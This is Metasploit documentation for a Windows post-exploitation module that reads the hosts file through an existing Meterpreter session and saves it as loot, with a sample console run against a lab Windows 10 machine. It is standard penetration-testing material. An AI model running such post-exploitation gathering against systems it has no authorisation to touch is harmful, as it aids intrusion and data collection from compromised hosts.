## Vulnerable Application

This module reads the hosts file on Windows systems, located at: 
`C:\\Windows\\System32\\drivers\\etc\\hosts`.  Any content lines are printed
and the file is stored in loot.

## Verification Steps

1. Start msfconsole
1. Get a session on Windows
1. Do: `use post/windows/gather/enum_hostfile`
1. Do: `set session [#]`
1. Do: `run`
1. You should get the hosts file

## Options

## Scenarios

### Windows 10

```
msf6 post(windows/gather/enum_hostfile) > use post/windows/gather/enum_hostfile 
msf6 post(windows/gather/enum_hostfile) > sessions -i 5
[*] Starting interaction with 5...

meterpreter > sysinfo
Computer        : MSEDGEWIN10
OS              : Windows 10 (10.0 Build 16299).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > background
[*] Backgrounding session 5...
msf6 post(windows/gather/enum_hostfile) > set session 5
session => 5
msf6 post(windows/gather/enum_hostfile) > run

Found entries:
[+] 1.1.1.1 supersecret
[*] Hosts file saved: /root/.msf4/loot/20201011174103_default_192.168.2.92_hosts.confige_103430.txt
[*] Post module execution completed
```
